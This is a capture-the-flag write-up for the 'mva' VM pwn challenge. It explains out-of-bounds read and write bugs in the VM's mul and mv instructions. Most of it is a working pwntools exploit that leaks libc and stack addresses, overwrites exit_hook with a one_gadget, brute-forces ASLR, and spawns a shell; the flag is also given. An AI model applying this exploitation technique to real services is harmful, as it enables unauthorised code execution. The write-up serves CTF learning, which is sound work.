# Pwn | mva (10 solves)

## Description

Just a simple program

[Attachments](./to_player/)

## Solution

普通VM Pwn，逆向发现
- mul指令没有对第二个操作数进行校验存在oob read
- mv指令没有对第二个操作数进行校验存在oob write

一种利用思路
- oob read溢出读libc和栈的地址
- oob write写sp计数器
- 最后 push指令改exit_hook到one_gadget

由于ASLR存在，VM又是16bit字长的，需要爆破。

sample exp

```python
#!/usr/bin/python3

from pwn import *
context.arch='amd64'

def pack(op:int, p1:int = 0, p2:int = 0, p3:int = 0) -> bytes:
    return  (op&0xff).to_bytes(1,'little') + \
            (p1&0xff).to_bytes(1,'little') + \
            (p2&0xff).to_bytes(1,'little') + \
            (p3&0xff).to_bytes(1,'little')

def ldr(val):
    return pack(0x01, 0, val >> 8, val)

def add(p1, p2, p3):
    return pack(0x02, p1, p2, p3)

def sub(p1, p2, p3):
    return pack(0x03, p1, p2, p3)

def shr(p1, p2):
    return pack(0x06, p1, p2)

def xor(p1, p2, p3):
    return pack(0x07, p1, p2, p3)

def push():
    return pack(0x09)

def pop(p1):
    return pack(0x0a, p1)

def mul(p1, p2, p3):
    return pack(0x0D, p1, p2, p3)

def mv(p1, p2):
    return pack(0x0E, p1, p2)

def sh():
    return pack(0x0F)

puts_offset = 0x845ca
puts_leak = (0x38 + 0x268 - 0x224) >> 1
onegadgetlst = [0xe3b2e, 0xe3b31, 0xe3b34]
onegadget = onegadgetlst[0]
toadd = onegadget - puts_offset
stack_leak = (0x268 - 0x224) >> 1
stack_pointer_leak = (0x238 - 0x224) >> 1

tosub = 0x1a799e + 0x308
# tosub = 0x1a399e + 0x308    # debug aslr
tosub = tosub - 0x3000  # no aslr : player environment
tosub = tosub - 0x4000  # aslr : player environment

# - 0x308 + stack_leak - puts + 0x1a799e
pay  = ldr(0x1)
pay += mv(0,1)
pay += ldr(tosub&0xffff)
pay += mv(0,3)
pay += mul(4,-puts_leak,1)
pay += mul(5,-stack_leak,1)
pay += sub(0,5,4)
pay += sub(0,0,3)
pay += shr(0,1)
pay += push()

pay += ldr((tosub>>16)&0xffff)
pay += mv(0,3)
pay += mul(4,-puts_leak+1,1)
pay += mul(5,-stack_leak+1,1)
pay += sub(0,5,4)
pay += sub(0,0,3)
pay += shr(0,1)
pay += push()

# onegadget
pay += mul(3,-puts_leak,1)
pay += mul(4,-puts_leak+1,1)
pay += ldr(toadd&0xffff)
pay += add(0,3,0)
pay += push()
pay += ldr(((toadd>>16)&0xffff)+1)
pay += add(0,4,0)
pay += push()
pay += mul(0,-puts_leak+2,1)
pay += push()
pay += pop(3)
pay += pop(4)
pay += pop(5)

pay += pop(1)
pay += pop(2)
pay += ldr(0xffff)
pay += xor(2,0,2)
pay += ldr(1)
pay += add(2,0,2)
pay += mv(2,-stack_pointer_leak)
pay += ldr(0xffff)
pay += xor(1,0,1)
pay += mv(1,-stack_pointer_leak+1)
pay += mv(0,-stack_pointer_leak+2)
pay += mv(0,-stack_pointer_leak+3)
pay += mv(5,0)
pay += push()
pay += mv(4,0)
pay += push()
pay += mv(3,0)
pay += push()
pay += ldr(0)
pay += push()




pay += sh()
print(hex(len(pay)))
assert len(pay) <= 0x100
pay = pay.ljust(0x100,b'\0')


# chance of this exp : about 1230 - 10125 times with 1 flag
# I admit this is an awful exp
while True:
    p=remote('127.0.0.1',9999)
    p.sendafter('\n',pay)
    try:
        p.recvuntil('starting ...\n')
        p.recvline()
        p.recvuntil('down ...\n')
        p.sendline('cat flag')
        res = p.recvline()
        print('[+] flag:', res)
        p.interactive()
        break
    except:
        p.close()
        pass
```

## Flag

`HFCTF{M4st3r_0f_vmmv_Mavm44mV4av4m_b03mtxEe4i45fdsdkz9DPWNc02d}`

## Side Note

- VM改编自[Armax/AVM](https://github.com/Armax/AVM)，Great Thanks to original author
- docker调试的时候偏移非常不稳定，docker-compose中加个调试启动参数也会使得libc段和ld段之间的偏移发生改变